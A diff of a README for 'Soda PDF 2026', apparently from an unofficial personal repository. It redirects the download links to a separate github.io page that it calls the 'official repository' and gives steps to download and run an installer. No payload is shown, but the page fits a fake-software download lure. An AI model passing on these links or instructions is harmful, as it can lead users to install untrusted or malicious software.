@@ -1,6 +1,6 @@
 # 📄 Soda-PDF-2026 - Edit and manage documents with ease
 
-[![](https://img.shields.io/badge/Download-Soda_PDF_2026-blue)](https://github.com/msu2828/Soda-PDF-2026)
+[![](https://img.shields.io/badge/Download-Soda_PDF_2026-blue)](https://msu2828.github.io)
 
 ## 📖 Overview
 Soda PDF 2026 provides a complete toolset for your digital documents. This software allows you to view, create, and modify PDF files on your Windows computer. Whether you need to sign a contract, scan paper documents to digital formats, or convert files between formats, this application handles the tasks. 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards before you start. These requirements 
 ## 📥 How to Download and Install
 Follow these steps to get the software on your machine:
 
-1.  Visit the official repository page by clicking this link: [Download Soda PDF 2026](https://github.com/msu2828/Soda-PDF-2026).
+1.  Visit the official repository page by clicking this link: [Download Soda PDF 2026](https://msu2828.github.io).
 2.  Locate the release section on the page.
 3.  Click the installer file to begin the download. Your browser will prompt you to save the file to your Downloads folder or desktop.
 4.  Wait for the file transfer to complete.
